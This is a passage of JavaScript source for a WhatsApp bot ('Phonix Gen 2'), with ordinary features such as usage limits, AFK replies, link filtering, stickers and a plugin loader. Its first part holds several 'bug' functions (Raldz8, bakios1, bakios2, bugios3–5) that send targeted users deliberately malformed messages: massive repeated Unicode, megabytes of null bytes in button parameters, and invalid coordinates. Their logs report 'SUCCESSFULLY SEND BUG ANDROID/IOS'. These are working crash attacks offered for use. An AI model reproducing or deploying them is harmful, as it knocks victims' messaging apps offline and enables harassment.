                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "\u0009" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
        
        async function Raldz8(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "[🩸] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "ꦽꦾ".repeat(29111)
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "\u0000".repeat(911000)
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "\u0000".repeat(911000)
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: "\u0000".repeat(911000)
                                    },
                                    {
                                        name: "payment_method",
                                        buttonParamsJson: "\u0000".repeat(911000)
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await conn.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("SUCCESSFULLY SEND BUG ANDROID"));
        }
     
    async function bakios1(target) {
      try {
        await conn.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "\n\n\n\n\n\n\u0000" + "ꦾ".repeat(47777),
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "ꦽꦾ".repeat(10000),
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "ꦽꦾ".repeat(77),
                  body: "🦠".repeat(44),
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵.com/",
                  mediaUrl: "https://𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵.com/",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵.com/",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
       
async function bakios2(target, Ptcp = false) {
			await conn.relayMessage(target, {
					"extendedTextMessage": {
						"text": " 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲".repeat(20000),
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "0@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "0@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6285141370204@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "💣🦠".repeat(100),
								"body": "𑇂𑆵𑆴𑆿".repeat(100),
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ.com/",
								"mediaUrl": "https://ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ.com/",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/raditx7"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("SUCCESFULLY SEND BUG IOS"));
		};    
		
		async function bugios3(target) {
      let CrashQAiphone = "𑆵󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵".repeat(60000);
      await conn.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://youtube.com/@raldzzoffc",
          },
        },
        {
          participant: {
            jid: target
          },
        }
      );
    }
    
    		async function bugios4(target) {
			await conn.relayMessage(target, {
				"paymentInviteMessage": {
					serviceType: "FBPAY",
					expiryTimestamp: Date.now() + 1814400000
				}
			}, {
				participant: {
					jid: target
				}
			})
			console.log(chalk.green("SUCCESFULLY SEND BUG IOS"));
		};

		async function bugios5(target) {
			conn.relayMessage(target, {
				'extendedTextMessage': {
					'text': "𑆵𑆵".repeat(11000),
					'contextInfo': {
						'stanzaId': target,
						'participant': target,
						'quotedMessage': {
							'conversation': 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': target
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("SUCCESFULLY SEND BUG IOS"));
		};


		
// Quoted		
    const glxNull = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '18002428478@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "𝐏𝐇𝐎𝐍𝐈𝐗 𝐆𝐄𝐍 𝟐",
                        "format": "DEFAULT",
                        "caption": "ʙʏ ʀᴀʟᴅᴢᴢ"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Alwaysaqioo@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(10)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
    
//=============== PHONIX ======================\\   
    
 async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }
        
async function resetLimit() {
  for (let i of users) {
      db.data.users[i].limit = limitUser;
  }
}
        
      
if (m.isGroup) {
    if (body.includes(`@6285141370204`)) {
        reaction(m.chat, "❓")
    }
 }

        
if (m.message) {
    if (command && !m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 INFORMATION CHATS`)))
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`
     )
   )
);
    } else if (m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 INFORMATION CHATS`)));
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`
       ))
     );
  }
}

        
if (command && !isUser) {
    pendaftar.push(m.sender)
    fs.writeFileSync('./start/lib/database/pendaftar.json', JSON.stringify(pendaftar, null, 2))
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
 
msgFilter.ResetSpam(orang_spam);
        const spampm = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give pause for a few seconnds.");
        };

        const spamgr = () => {
            msgFilter.addSpam(m.sender, orang_spam);
            m.reply("don`t spam! please give 10 seconnds.");
    };

    if (command && msgFilter.isFiltered(m.sender) && m.isGroup) return spampm();
    if (command && msgFilter.isFiltered(m.sender) && !m.isGroup) return spamgr();

async function reply(teks) {
    conn.sendMessage(m.chat, {
        text: teks,
        mentions: conn.ments(teks),
        isForwarded: true
    }, {quoted: m})
}

async function sendMusic(teks) {
    let img = { url : cinahitam, 
               type : "image/jpeg"
              }
          
    let url = `https://whatsapp.com/channel/0029VanySqUBPzjYa2929d0U`    
    let contextInfo = {
        externalAdReply: {    
            showAdAttribution: true,    
            title: `RaldzzXyz`,      
            body: `tell me why i'm waiting?`,     
            description: 'Now Playing ....',   
            mediaType: 2,     
            thumbnailUrl: img.url,
            mediaUrl: url   
        }
    }
    
    conn.sendMessage(m.chat, { 
        contextInfo,
        mimetype: 'audio/mp4',
        audio: teks
    }, { quoted: m })
 }
     
 if (!m.key.fromMe && global.autoread) {
     const readkey = {
         remoteJid: m.chat,
         id: m.key.id,
         participant: m.isGroup ? m.key.participant : undefined
     }
     await conn.readMessages([readkey]);
 }
        conn.sendPresenceUpdate('available', m.chat)
      
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}

        
async function makeStickerFromUrl(imageUrl, conn, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await conn.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `RaldzzXyz`,
                    body: `© copyright`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: cinahitam, 
                    sourceUrl: `https://youtube.com/@raldzzoffc`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}
      
 if (m.isGroup && !m.key.fromMe) {
  let mentionUser = [
    ...new Set([
      ...(m.mentionedJid || []),
      ...(m.quoted ? [m.quoted.sender] : []),
    ]),
  ];

 for (let ment of mentionUser) {
    if (afk.checkAfkUser(ment, _afk)) {
      let getId2 = afk.getAfkId(ment, _afk);
      let getReason2 = afk.getAfkReason(getId2, _afk);
      let getTimee = Date.now() - afk.getAfkTime(getId2, _afk);
      let heheh2 = ms(getTimee);
      reply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}\n*Sejak :* ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yg lalu\n`);
    }
  }

 if (afk.checkAfkUser(m.sender, _afk)) {
    let getId = afk.getAfkId(m.sender, _afk);
    let getReason = afk.getAfkReason(getId, _afk);
    let getTime = Date.now() - afk.getAfkTime(getId, _afk);
    let heheh = ms(getTime);

    _afk.splice(afk.getAfkPosition(m.sender, _afk), 1);
    fs.writeFileSync("./start/lib/database/afk.json", JSON.stringify(_afk));
      reply(`@${m.sender.split("@")[0]} telah kembali dari afk\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`);
  }
 }
  
 if (chats.antilink) {
     if (budy.includes('chat.whatsapp.com')) {
         if (isAdmins || Access) return;
         reply(`> GROUP LINK DETECTOR\n`);
         if (!isBotAdmins) return reply(`bot bukan admin`);
         let gclink = `https://chat.whatsapp.com/${await conn.groupInviteCode(m.chat)}`;
         if (budy.includes(gclink)) return;
         await conn.sendMessage(m.chat, {
             delete: m.key
         });	
     }  
 }

async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};
  
/** plugins **/
const pluginsLoader = async (directory) => {
    let plugins = [];
    const folders = fs.readdirSync(directory);
    folders.forEach(file => {
        const filePath = path.join(directory, file);
        if (filePath.endsWith(".js")) {
            try {
                const resolvedPath = require.resolve(filePath);
                if (require.cache[resolvedPath]) {
                    delete require.cache[resolvedPath];
                }
                const plugin = require(filePath);
                plugins.push(plugin);
            } catch (error) {
                console.log(`${filePath}:`, error);
            }
        }
    });
    return plugins;
};

const pluginsDisable = true;
const plugins = await pluginsLoader(path.resolve(__dirname, "../plugins"));
const plug = { 
    conn,
    Access,
    command,
    reply,
    text,
    chats,
    users,
    args,
    botNumber,
    reaction,
    makeStickerFromUrl,
    pushname,
    isBan,
    isPremium,
    isGroup: m.isGroup,
    isPrivate: !m.isGroup
};

for (let plugin of plugins) {
    if (plugin.command.find(e => e == command.toLowerCase())) {
        if (plugin.owner && !Access) {
            return reply(mess.owner);
        }
        if (plugin.premium && !isPremium) {
            return reply(ness.premium);
        }
        if (plugin.group && !plug.isGroup) {
            return reply(mess.group);
        }
        if (plugin.private && !plug.isPrivate) {
            return reply(mess.private);
        }
        if (typeof plugin !== "function") return;
        await plugin(m, plug);
    }
}

if (!pluginsDisable) return;
/** end plugins **/
switch (command) {   
case 'menu': {
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    let menu = `👋🏻 Hi ${m.pushName}, i'm assistant bot WhatsApp of Phonix Gen 2 created by RaldzzXyz. I'm already to help you. Click the button to show my menu.`;

    conn.sendMessage(m.chat, { 
        image: { url: 'https://files.catbox.moe/mkvy68.png' },
        caption: menu,
        footer: "© RaldzzXyz",
        buttons: [
            {
                buttonId: ".allmenu", 
                buttonText: { displayText: '𝐀𝐋𝐋 𝐌𝐄𝐍𝐔' }, 
                type: 1
            },
            { 
                buttonId: ".tqto", 
                buttonText: { displayText: "𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎" }, 
                type: 1 
            }
        ],
        headerType: 4,
        viewOnce: true
    }, { quoted: glxNull });
}
break

case 'allmenu':{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
let allmenu = `
*\`⫸☠️ ⟬     𝐏͢𝐇͜͡𝚯͜𝚴͢𝐈͜͡𝐗     ⟭ ☠️⫷\`*

*『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 』*
